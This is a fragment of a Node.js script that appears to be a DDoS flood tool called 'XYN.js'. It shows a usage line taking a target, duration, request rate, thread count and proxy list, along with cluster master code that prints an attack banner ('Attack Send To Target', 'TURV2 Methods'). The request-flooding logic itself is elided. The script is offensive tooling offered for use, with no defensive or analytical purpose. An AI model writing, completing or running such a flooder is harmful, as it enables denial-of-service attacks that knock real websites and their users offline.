...
process.on("unhandledRejection", errorHandler);
 ...
 if (process.argv.length < 7){console.log(`Usage: node XYN.js target time rate thread proxy.txt`); process.exit();}
 const headers = {};
...
const rateHeaders2 = [
 ...
 if (cluster.isMaster) {
    console.clear()
    console.log(`Attack Send To Target : `.gray + process.argv[2])
    console.log(`--------------------------------------------`)
    console.log(`TURV2  Methods`)
    console.log(`Target: `.brightRed + process.argv[2])
    console.log(`Time: `.brightRed + process.argv[3])
    console.log(`Rate: `.brightRed + process.argv[4])
    console.log(`Thread: `.brightRed + process.argv[5])
    console.log(`ProxyFile: `.brightRed + process.argv[6])
    console.log(`--------------------------------------------`)
